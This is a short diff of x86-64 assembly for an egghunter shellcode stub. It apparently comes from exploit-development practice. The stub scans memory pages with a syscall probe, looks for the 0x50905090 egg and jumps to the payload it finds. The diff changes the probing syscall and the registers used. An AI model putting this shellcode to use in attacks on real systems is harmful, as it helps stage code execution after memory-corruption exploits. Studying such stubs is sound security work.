@@ -4,20 +4,20 @@ section .text
 
 _start:
 
-	xor rdx, rdx
+	xor rsi, rsi
 
 switch_page:
 
-	or dx, 0xfff
+	or si, 0xfff
 
 scan_page:
 
-	inc rdx
+	inc rsi
 
 	xor rax, rax
-	xor rsi, rsi
-	lea rdi, [rdx+0x4]
-	mov al, 21
+	add rax, 13
+	xor r10, r10
+	add r10, 8
 	syscall
 
 	cmp al, 0xf2
@@ -25,9 +25,10 @@ scan_page:
 
 	; half egg
 	mov eax, 0x50905090
-	mov rdi, rdx
+	mov rdi, rsi
 	scasd
 	jnz scan_page
+
 	scasd
 	jnz scan_page
-	jmp rdi
+	jmp rsi
